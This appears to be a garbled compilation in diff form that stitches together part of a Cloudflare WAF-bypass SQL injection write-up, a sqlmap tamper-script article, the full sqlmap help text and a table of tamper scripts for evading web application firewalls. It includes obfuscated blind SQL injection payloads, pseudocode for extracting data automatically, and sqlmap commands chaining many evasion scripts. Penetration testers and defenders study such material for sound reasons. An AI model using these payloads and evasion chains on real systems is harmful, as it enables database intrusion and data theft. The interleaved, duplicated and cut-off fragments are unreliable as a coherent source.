+The above injection sends the character ‘a’ as the hex-encoded value ‘0x61’ which still allows it to work:
+
+'0x61' LIKE 'a'
+still returns True, and
+
+'0x61' LIKE 'b'
+passes through undetected and returns False.
+
+The resulting INJECTION 1 now looks like this:
+
+'0x61' LIKE
+ (SELECT SUBSTRING(column_name, 1, 1)
+  FROM information_schema.columns
+  WHERE table_name = "t1"
+  LIMIT 0, 1
+ )
+Third Try
+The third obfuscation I had to enroll was a multi-line comment addition between SQL query keywords. Cloudflare would block queries like this:
+
+SELECT c1,c2,c3 FROM t1 WHERE '0x61' LIKE 'b'
+but with a multi-line comment trick, the new query would go through undetected:
+
+SELECT/*trick comment*/ c1,c2,c3
+FROM/*trick comment*/ t1
+WHERE '0x61' LIKE 'b'
+Thus, applying this method on INJECTION 1, would make it look like this:
+
+'0x61' LIKE
+SQLmap tamper script for bypassing WAF
+BY DO SON · PUBLISHED AUGUST 30, 2019 · UPDATED AUGUST 24, 2023
+
+
+Tamper injection data
+Option: –tamper
+
+
+sqlmap itself does no obfuscation of the payload sent, except for strings between single quotes replaced by their CHAR()-alike representation. More information about programming you can find on Thoughtsoncloud.
+
+Vulnerability Scanner Detector Log4...
+
+Pause
+
+Unmute
+Remaining Time -34:38
+
+
+Fullscreen
+Vulnerability Scanner Detector Log4Shell Remote Code Execution Log4j (CVE-2021–44228) —Ansible log4j
+
+This option can be very useful and powerful in situations where there is a weak input validation mechanism between you and the back-end database management system. This mechanism usually is a self-developed input validation routine called by the application source code, an expensive enterprise-grade IPS appliance or a web application firewall (WAF). All buzzwords to define the same concept, implemented in a different way and costing lots of money, usually.
+
+
+
+
+To take advantage of this option, provide sqlmap with a comma-separated list of tamper scripts and this will process the payload and return it transformed. You can define your own tamper scripts, use sqlmap ones from the tamper/ folder or edit them as long as you concatenate them comma-separated as a value of the option --tamper (e.g. --tamper="between,randomcase").
+
+Here are the list tamper injection data
+
+apostrophemask.py replace single quote character in UTF-8-byte characters
+apostrophenullencode.py replace single-quote character with an illegal double-byte Unicode characters
+appendnullbyte.py, add a null character at the end of payload encoding
+base64encode.py use Base64 encoding for a given payload all characters
+between.py, “the BETWEEN the AND # #” is replaced with “NOT BETWEEN 0 AND #” replace greater-than sign “>” equal sign “=”
+bluecoat.py After the SQL statements replace spaces with valid random whitespace, followed by “the LIKE” Alternatively equal sign “=”
+chardoubleencode.py use double URL encoding for a given payload all characters (not handle characters already encoded)
+charencode.py use URL encoding for a given payload all characters (not handle characters already encoded)
+charunicodeencode.py use Unicode URL encoding for a given payload of non-coded character (the character does not handle already encoded)
+concat2concatws.py with Examples “CONCAT_WS (MID (CHAR (0 ), 0, 0), A, B)” replacement image “CONCAT (A, B)” is
+equaltolike.py with “the LIKE” operator replace all equal sign “=”
+greatest.py Alternatively greater than “>” use “GREATEST” function
+halfversionedmorekeywords.py add MySQL comments before each keyword
+ifnull2ifisnull.py with “IF (ISNULL (A), B, A)” replacement image “IFNULL (A, B)” Examples
+lowercase.py replace the value of each keyword character lowercase
+modsecurityversioned.py surrounded by complete query with a comment
+modsecurityzeroversioned.py comments with zero digits of which is surrounded by a full inquiry
+multiplespaces.py add more spaces around SQL keywords
+nonrecursivereplacement.py replace the predefined keywords using SQL representations, a filter suitable for
+overlongutf8.py conversion to all characters in a given payload among
+percentage.py add a percent sign before each character
+randomcase.py random character case conversion for each keyword
+randomcomments.py insert random comments to SQL keywords
+securesphere.py add the string through a special configuration
+sp_password.py Appends ‘sp_password’ to the end of the payload for automatic obfuscation from DBMS logs
+space2comment.py replace spaces with “/ ** /”
+space2dash.py dash comment character “-” followed by a linefeed a random string of characters and replace the space character
+space2hash.py pounds comment character “#” followed by a linefeed a random string of characters and replace the space character
+space2morehash.py pounds comment character “#” followed by a linefeed a random string of characters and replace the space character
+space2mssqlblank.py replace spaces with a set of valid candidate among the set of random character whitespace
+space2mssqlhash.py pounds comment symbol “#” followed by a space character to replace newline
+space2mysqlblank.py replace spaces with a set of valid candidate among the set of random character whitespace
+space2mysqldash.py dash comment character “-” followed by a linefeed character replace spaces
+space2plus.py a plus “+” with spaces
+space2randomblank.py replace spaces with a set of valid candidate among the set of random character whitespace
+unionalltounion.py Replaces UNION ALL SELECT with UNION SELECT
+unmagicquotes.py use a combination of multi-byte% bf% 27 and the end of general note replaced with spaces
+varnish.py add an HTTP header “X-originating-IP” to bypass WAF
+versionedkeywords.py surrounding each non-comment function key with MySQL
+versionedmorekeywords.py surrounded by each keyword with a MySQL Notes
+Usage
+MSSQL:
+
+tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+ 
+
+MySQL:
+
+ tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+ 
+
+General Tamper testing:
+
+tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+ 
+
+Example:
+sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+ (SELECT/*trick comment*/ SUBSTRING(column_name, 1, 1)
+  FROM/*trick comment*/ information_schema.columns
+  WHERE table_name = "t1"
+  LIMIT 0, 1
+ )
+The above injection is in its final form and when passed as a form value to the vulnerable web application the web server will reply with a 200 OK if the character ‘a’ matches the first character of the first column’s name of table t1.
+
+Full Speed Ahead
+To make the retrieving of table contents from the application’s database easier I wrote a script in Python to automate the process. The pseudocode of the script goes something like this:
+
+# assert names of columns and table name is known
+alphabet = [a,b,c,...,y,z]
+characterPosition = 1 # the position of the character we are bruteforcing
+for rowNumber in [0,20]:
+  for columnName in columns:
+    for character in alphabet:
+      sqlInjection = '''
+        0x{hex_encode(character)} LIKE (
+        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)
+        FROM/*trick comment*/ tableName
+        LIMIT {rowNumber}, 1
+        )
+      '''
+
+      inject sqlInjection is POST request body
+      if response.status == 200:
+        result += character
+        recurse function with characterPosition++
+      elif response.status == 500:
+        continue with next character in alphabet
+
+      return result
+And this is how I bypassed Cloudflare WAF’s SQL injection protection. I got a free t-shirt and a place in Cloudflare’s HoF.
+
+Mitigation
+Cloudlfare reviewed and fixed the vulnerability a few days after my report.
+
+The safest way to mitigate SQL injections on your databases is prepared statements. These come in most database interaction libraries for most languages. You can find a full list of ways to mitigate SQL injections at OWASP. It is my opinion that if developers take good care to apply security measures on their applications, WAFs are most of the times unnecessary. All you need to do is sanitize the users’ input properly.Usage
+Usage: python sqlmap.py [options]
+
+Options:
+  -h, --help            Show basic help message and exit
+  -hh                   Show advanced help message and exit
+  --version             Show program's version number and exit
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+    -d DIRECT           Connection string for direct database connection
+    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
+    -m BULKFILE         Scan multiple targets given in a textual file
+    -r REQUESTFILE      Load HTTP request from a file
+    -g GOOGLEDORK       Process Google dork results as target URLs
+    -c CONFIGFILE       Load options from a configuration INI file
+
+  Request:
+    These options can be used to specify how to connect to the target URL
+
+    -A AGENT, --user..  HTTP User-Agent header value
+    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
+    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
+    --data=DATA         Data string to be sent through POST (e.g. "id=1")
+    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
+    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
+    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
+    --live-cookies=L..  Live cookies file used for loading up-to-date values
+    --load-cookies=L..  File containing cookies in Netscape/wget format
+    --drop-set-cookie   Ignore Set-Cookie header from response
+    --mobile            Imitate smartphone through HTTP User-Agent header
+    --random-agent      Use randomly selected HTTP User-Agent header value
+    --host=HOST         HTTP Host header value
+    --referer=REFERER   HTTP Referer header value
+    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
+    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
+    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
+    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
+    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)
+    --ignore-proxy      Ignore system default proxy settings
+    --ignore-redirects  Ignore redirection attempts
+    --ignore-timeouts   Ignore connection timeouts
+    --proxy=PROXY       Use a proxy to connect to the target URL
+    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
+    --proxy-file=PRO..  Load proxy list from a file
+    --proxy-freq=PRO..  Requests between change of proxy from a given list
+    --tor               Use Tor anonymity network
+    --tor-port=TORPORT  Set Tor proxy port other than default
+    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
+    --check-tor         Check to see if Tor is used properly
+    --delay=DELAY       Delay in seconds between each HTTP request
+    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
+    --retries=RETRIES   Retries when the connection timeouts (default 3)
+    --randomize=RPARAM  Randomly change value for given parameter(s)
+    --safe-url=SAFEURL  URL address to visit frequently during testing
+    --safe-post=SAFE..  POST data to send to a safe URL
+    --safe-req=SAFER..  Load safe HTTP request from a file
+    --safe-freq=SAFE..  Regular requests between visits to a safe URL
+    --skip-urlencode    Skip URL encoding of payload data
+    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
+    --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token
+    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
+    --csrf-retries=C..  Retries for anti-CSRF token retrieval (default 0)
+    --force-ssl         Force usage of SSL/HTTPS
+    --chunked           Use HTTP chunked transfer encoded (POST) requests
+    --hpp               Use HTTP parameter pollution method
+    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
+                        "import hashlib;id2=hashlib.md5(id).hexdigest()")
+
+  Optimization:
+    These options can be used to optimize the performance of sqlmap
+
+    -o                  Turn on all optimization switches
+    --predict-output    Predict common queries output
+    --keep-alive        Use persistent HTTP(s) connections
+    --null-connection   Retrieve page length without actual HTTP response body
+    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
+
+  Injection:
+    These options can be used to specify which parameters to test for,
+    provide custom injection payloads and optional tampering scripts
+
+    -p TESTPARAMETER    Testable parameter(s)
+    --skip=SKIP         Skip testing for given parameter(s)
+    --skip-static       Skip testing parameters that not appear to be dynamic
+    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")
+    --param-filter=P..  Select testable parameter(s) by place (e.g. "POST")
+    --dbms=DBMS         Force back-end DBMS to provided value
+    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
+    --os=OS             Force back-end DBMS operating system to provided value
+    --invalid-bignum    Use big numbers for invalidating values
+    --invalid-logical   Use logical operations for invalidating values
+    --invalid-string    Use random strings for invalidating values
+    --no-cast           Turn off payload casting mechanism
+    --no-escape         Turn off string escaping mechanism
+    --prefix=PREFIX     Injection payload prefix string
+    --suffix=SUFFIX     Injection payload suffix string
+    --tamper=TAMPER     Use given script(s) for tampering injection data
+
+  Detection:
+    These options can be used to customize the detection phase
+
+    --level=LEVEL       Level of tests to perform (1-5, default 1)
+    --risk=RISK         Risk of tests to perform (1-3, default 1)
+    --string=STRING     String to match when query is evaluated to True
+    --not-string=NOT..  String to match when query is evaluated to False
+    --regexp=REGEXP     Regexp to match when query is evaluated to True
+    --code=CODE         HTTP code to match when query is evaluated to True
+    --smart             Perform thorough tests only if positive heuristic(s)
+    --text-only         Compare pages based only on the textual content
+    --titles            Compare pages based only on their titles
+
+  Techniques:
+    These options can be used to tweak testing of specific SQL injection
+    techniques
+
+    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
+    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
+    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
+    --union-char=UCHAR  Character to use for bruteforcing number of columns
+    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
+    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
+    --second-url=SEC..  Resulting page URL searched for second-order response
+    --second-req=SEC..  Load second-order HTTP request from file
+
+  Fingerprint:
+    -f, --fingerprint   Perform an extensive DBMS version fingerprint
+
+  Enumeration:
+    These options can be used to enumerate the back-end database
+    management system information, structure and data contained in the
+    tables
+
+    -a, --all           Retrieve everything
+    -b, --banner        Retrieve DBMS banner
+    --current-user      Retrieve DBMS current user
+    --current-db        Retrieve DBMS current database
+    --hostname          Retrieve DBMS server hostname
+    --is-dba            Detect if the DBMS current user is DBA
+    --users             Enumerate DBMS users
+    --passwords         Enumerate DBMS users password hashes
+    --privileges        Enumerate DBMS users privileges
+    --roles             Enumerate DBMS users roles
+    --dbs               Enumerate DBMS databases
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --schema            Enumerate DBMS schema
+    --count             Retrieve number of entries for table(s)
+    --dump              Dump DBMS database table entries
+    --dump-all          Dump all DBMS databases tables entries
+    --search            Search column(s), table(s) and/or database name(s)
+    --comments          Check for DBMS comments during enumeration
+    --statements        Retrieve SQL statements being run on DBMS
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table(s) to enumerate
+    -C COL              DBMS database table column(s) to enumerate
+    -X EXCLUDE          DBMS database identifier(s) to not enumerate
+    -U USER             DBMS user to enumerate
+    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
+    --pivot-column=P..  Pivot column name
+    --where=DUMPWHERE   Use WHERE condition while table dumping
+    --start=LIMITSTART  First dump table entry to retrieve
+    --stop=LIMITSTOP    Last dump table entry to retrieve
+    --first=FIRSTCHAR   First query output word character to retrieve
+    --last=LASTCHAR     Last query output word character to retrieve
+    --sql-query=SQLQ..  SQL statement to be executed
+    --sql-shell         Prompt for an interactive SQL shell
+    --sql-file=SQLFILE  Execute SQL statements from given file(s)
+
+  Brute force:
+    These options can be used to run brute force checks
+
+    --common-tables     Check existence of common tables
+    --common-columns    Check existence of common columns
+    --common-files      Check existence of common files
+
+  User-defined function injection:
+    These options can be used to create custom user-defined functions
+
+    --udf-inject        Inject custom user-defined functions
+    --shared-lib=SHLIB  Local path of the shared library
+
+  File system access:
+    These options can be used to access the back-end database management
+    system underlying file system
+
+    --file-read=FILE..  Read a file from the back-end DBMS file system
+    --file-write=FIL..  Write a local file on the back-end DBMS file system
+    --file-dest=FILE..  Back-end DBMS absolute filepath to write to
+
+  Operating system access:
+    These options can be used to access the back-end database management
+    system underlying operating system
+
+    --os-cmd=OSCMD      Execute an operating system command
+    --os-shell          Prompt for an interactive operating system shell
+    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
+    --os-bof            Stored procedure buffer overflow exploitation
+    --priv-esc          Database process user privilege escalation
+    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
+    --tmp-path=TMPPATH  Remote absolute path of temporary files directory
+
+  Windows registry access:
+    These options can be used to access the back-end database management
+    system Windows registry
+
+    --reg-read          Read a Windows registry key value
+    --reg-add           Write a Windows registry key value data
+    --reg-del           Delete a Windows registry key value
+    --reg-key=REGKEY    Windows registry key
+    --reg-value=REGVAL  Windows registry key value
+    --reg-data=REGDATA  Windows registry key value data
+    --reg-type=REGTYPE  Windows registry key value type
+
+  General:
+    These options can be used to set some general working parameters
+
+    -s SESSIONFILE      Load session from a stored (.sqlite) file
+    -t TRAFFICFILE      Log all HTTP traffic into a textual file
+    --answers=ANSWERS   Set predefined answers (e.g. "quit=N,follow=N")
+    --base64=BASE64P..  Parameter(s) containing Base64 encoded data
+    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)
+    --batch             Never ask for user input, use the default behavior
+    --binary-fields=..  Result fields having binary values (e.g. "digest")
+    --check-internet    Check Internet connection before assessing the target
+    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
+    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
+    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
+    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
+    --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")
+    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
+    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)
+    --eta               Display for each output the estimated time of arrival
+    --flush-session     Flush session files for current target
+    --forms             Parse and test forms on target URL
+    --fresh-queries     Ignore query results stored in session file
+    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
+    --har=HARFILE       Log all HTTP traffic into a HAR file
+    --hex               Use hex conversion during data retrieval
+    --output-dir=OUT..  Custom output directory path
+    --parse-errors      Parse and display DBMS error messages from responses
+    --preprocess=PRE..  Use given script(s) for preprocessing (request)
+    --postprocess=PO..  Use given script(s) for postprocessing (response)
+    --repair            Redump entries having unknown character marker (?)
+    --save=SAVECONFIG   Save options to a configuration INI file
+    --scope=SCOPE       Regexp for filtering targets
+    --skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities
+    --skip-waf          Skip heuristic detection of WAF/IPS protection
+    --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
+    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
+    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
+    --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")
+
+  Miscellaneous:
+    These options do not fit into any other category
+
+    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
+    --alert=ALERT       Run host OS command(s) when SQL injection is found
+    --beep              Beep on question and/or when SQLi/XSS/FI is found
+    --dependencies      Check for missing (optional) sqlmap dependencies
+    --disable-coloring  Disable console output coloring
+    --list-tampers      Display list of available tamper scripts
+    --offline           Work in offline mode (only use session data)
+    --purge             Safely remove all content from sqlmap data directory
+    --results-file=R..  Location of CSV results file in multiple targets mode
+    --shell             Prompt for an interactive sqlmap shell
+    --tmp-dir=TMPDIR    Local directory for storing temporary files
+    --unstable          Adjust options for unstable connections
+    --update            Update sqlmap
+    --wizard            Simple wizard interface for beginner users
+===================COMMANDS------MANUAL==========================
+To take advantage of this option, provide sqlmap with a comma-separated list of tamper scripts and this will process the payload and return it transformed. You can define your own tamper scripts, use sqlmap ones from the tamper/ folder or edit them as long as you concatenate them comma-separated as a value of the option --tamper (e.g. --tamper="between,randomcase").
+
+Here are the list tamper injection data
+
+apostrophemask.py replace single quote character in UTF-8-byte characters
+apostrophenullencode.py replace single-quote character with an illegal double-byte Unicode characters
+appendnullbyte.py, add a null character at the end of payload encoding
+base64encode.py use Base64 encoding for a given payload all characters
+between.py, “the BETWEEN the AND # #” is replaced with “NOT BETWEEN 0 AND #” replace greater-than sign “>” equal sign “=”
+bluecoat.py After the SQL statements replace spaces with valid random whitespace, followed by “the LIKE” Alternatively equal sign “=”
+chardoubleencode.py use double URL encoding for a given payload all characters (not handle characters already encoded)
+charencode.py use URL encoding for a given payload all characters (not handle characters already encoded)
+charunicodeencode.py use Unicode URL encoding for a given payload of non-coded character (the character does not handle already encoded)
+concat2concatws.py with Examples “CONCAT_WS (MID (CHAR (0 ), 0, 0), A, B)” replacement image “CONCAT (A, B)” is
+equaltolike.py with “the LIKE” operator replace all equal sign “=”
+greatest.py Alternatively greater than “>” use “GREATEST” function
+halfversionedmorekeywords.py add MySQL comments before each keyword
+ifnull2ifisnull.py with “IF (ISNULL (A), B, A)” replacement image “IFNULL (A, B)” Examples
+lowercase.py replace the value of each keyword character lowercase
+modsecurityversioned.py surrounded by complete query with a comment
+modsecurityzeroversioned.py comments with zero digits of which is surrounded by a full inquiry
+multiplespaces.py add more spaces around SQL keywords
+nonrecursivereplacement.py replace the predefined keywords using SQL representations, a filter suitable for
+overlongutf8.py conversion to all characters in a given payload among
+percentage.py add a percent sign before each character
+randomcase.py random character case conversion for each keyword
+randomcomments.py insert random comments to SQL keywords
+securesphere.py add the string through a special configuration
+sp_password.py Appends ‘sp_password’ to the end of the payload for automatic obfuscation from DBMS logs
+space2comment.py replace spaces with “/ ** /”
+space2dash.py dash comment character “-” followed by a linefeed a random string of characters and replace the space character
+space2hash.py pounds comment character “#” followed by a linefeed a random string of characters and replace the space character
+space2morehash.py pounds comment character “#” followed by a linefeed a random string of characters and replace the space character
+space2mssqlblank.py replace spaces with a set of valid candidate among the set of random character whitespace
+space2mssqlhash.py pounds comment symbol “#” followed by a space character to replace newline
+space2mysqlblank.py replace spaces with a set of valid candidate among the set of random character whitespace
+space2mysqldash.py dash comment character “-” followed by a linefeed character replace spaces
+space2plus.py a plus “+” with spaces
+space2randomblank.py replace spaces with a set of valid candidate among the set of random character whitespace
+unionalltounion.py Replaces UNION ALL SELECT with UNION SELECT
+unmagicquotes.py use a combination of multi-byte% bf% 27 and the end of general note replaced with spaces
+varnish.py add an HTTP header “X-originating-IP” to bypass WAF
+versionedkeywords.py surrounding each non-comment function key with MySQL
+versionedmorekeywords.py surrounded by each keyword with a MySQL Notes
+Usage
+MSSQL:
+
+tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+ 
+
+MySQL:
+
+ tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+ 
+
+General Tamper testing:
+
+tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+ 
+
+Example:
+sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+SQLMAP TAMPER SCRIPTS
+Sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
+
+This blog explains various tamper scripts and their usage.
+
+Credits to original author for piling this up
+
+TAMPER SCRIPT	TESTED against	NOTES \ TIPS
+apostrophemask	UNIVERSAL \ NOT DESCRIBED	Replaces apostrophe character with its UTF-8 full width counterpart
+apostrophenullencode	UNIVERSAL \ NOT DESCRIBED	Replaces apostrophe character with its illegal double unicode counterpart
+appendnullbyte	Microsoft Access \ TEST FURTHER	Useful to bypass weak web application firewalls when the back-end database management system is Microsoft Access - further uses are also possible
+base64encode	UNIVERSAL \ NOT DESCRIBED	Base64 encode all characters in a given payload
+between	Microsoft SQL Server 2005	Useful to bypass weak and bespoke web application firewalls that filter the greater than character The BETWEEN clause is SQL standard. Hence, this tamper script should work against all (?) databases
+
+ 
+between	MySQL 4	Useful to bypass weak and bespoke web application firewalls that filter the greater than character The BETWEEN clause is SQL standard. Hence, this tamper script should work against all (?) databases
+
+ 
+between	MySQL 5.0	Useful to bypass weak and bespoke web application firewalls that filter the greater than character The BETWEEN clause is SQL standard. Hence, this tamper script should work against all (?) databases
+
+ 
+between	Oracle 10g	Useful to bypass weak and bespoke web application firewalls that filter the greater than character The BETWEEN clause is SQL standard. Hence, this tamper script should work against all (?) databases
+
+ 
+between	PostgreSQL 8.3	Useful to bypass weak and bespoke web application firewalls that filter the greater than character The BETWEEN clause is SQL standard. Hence, this tamper script should work against all (?) databases
+
+ 
+between	PostgreSQL 8.4	Useful to bypass weak and bespoke web application firewalls that filter the greater than character The BETWEEN clause is SQL standard. Hence, this tamper script should work against all (?) databases
+
+ 
+between	PostgreSQL 9.0	Useful to bypass weak and bespoke web application firewalls that filter the greater than character The BETWEEN clause is SQL standard. Hence, this tamper script should work against all (?) databases
+
+ 
+between	MySQL 5.5	Useful to bypass weak and bespoke web application firewalls that filter the greater than character The BETWEEN clause is SQL standard. Hence, this tamper script should work against all (?) databases
+
+ 
+bluecoat	MySQL 5.1	Replaces space character after SQL statement with a valid random blank character. Afterwards replace character = with LIKE operator Useful to bypass Blue Coat's recommended WAF rule configuration
+bluecoat	SGOS	Replaces space character after SQL statement with a valid random blank character. Afterwards replace character = with LIKE operator Useful to bypass Blue Coat's recommended WAF rule configuration
+chardoubleencode	UNIVERSAL \ NOT DESCRIBED	Double url-encodes all characters in a given payload (not processing already encoded) * Useful to bypass some weak web application firewalls that do not double url-decode the request before processing it through their ruleset
+charencode	Microsoft SQL Server 2005	Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset. The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS
+charencode	MySQL 4	Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset. The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS
+charencode	MySQL 5.0	Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset. The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS
+charencode	MySQL 5.5	Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset. The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS
+charencode	Oracle 10g	Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset. The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS
+charencode	PostgreSQL 8.3	Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset. The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS
+charencode	PostgreSQL 8.4	Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset. The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS
+charencode	PostgreSQL 9.0	Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset. The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS
+charunicodeencode	ASP	Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset
+charunicodeencode	ASP.NET	Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset
+charunicodeencode	Microsoft SQL Server 2000	Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset
+charunicodeencode	Microsoft SQL Server 2005	Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset
+charunicodeencode	MySQL 5.1.56	Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset
+charunicodeencode	PostgreSQL 9.0.3	Useful to bypass weak web application firewalls that do not unicode url-decode the request before processing it through their ruleset
+charunicodeescape	UNIVERSAL \ NOT DESCRIBED	Useful to bypass weak filtering and/or WAFs in JSON contexes, Unicode-escapes non-encoded characters in a given payload (not processing already encoded).
+commalesslimit	MySQL	Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'
+commalesslimit	MySQL 5.0	Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'
+commalesslimit	MySQL 5.5	Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'
+commalessmid	MySQL	Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'
+commalessmid	MySQL 5.0	Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'
+commalessmid	MySQL 5.5	Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'
+commentbeforeparentheses	Microsoft SQL Server	Useful to bypass web application firewalls that block usage of function calls
+commentbeforeparentheses	MySQL	Useful to bypass web application firewalls that block usage of function calls
+commentbeforeparentheses	Oracle	Useful to bypass web application firewalls that block usage of function calls
+commentbeforeparentheses	PostgreSQL	Useful to bypass web application firewalls that block usage of function calls
+concat2concatws	MySQL	Useful to bypass very weak and bespoke web application firewalls that filter the CONCAT() function
+concat2concatws	MySQL 5.0	Useful to bypass very weak and bespoke web application firewalls that filter the CONCAT() function
